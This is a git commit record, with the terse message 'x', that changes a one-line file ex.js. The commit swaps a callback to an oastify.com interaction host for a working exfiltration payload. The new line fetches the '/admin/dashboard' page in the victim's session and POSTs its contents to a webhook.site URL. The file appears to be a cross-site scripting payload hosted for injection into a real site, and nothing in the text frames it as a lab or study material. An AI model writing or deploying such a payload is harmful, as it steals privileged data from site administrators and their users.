f934676ec46dbc476bf9ad58ef523ed65804d40d
0xB0xB <37478611+0xB0xB@users.noreply.github.com>
2026-01-13 19:17:33 +0400

    x

--- ex.js
+++ ex.js
@@ -1,1 +1,1 @@
-fetch('https://8z8e0w3lunw1qddvsfjm4z3lgcm3fr7fw.oastify.com');
+fetch('/admin/dashboard').then(r=>r.text()).then(d=>fetch('https://webhook.site/0b8aee5b-c91a-44fc-b825-d36d6ad0bc6e',{method:'POST',body:d}))
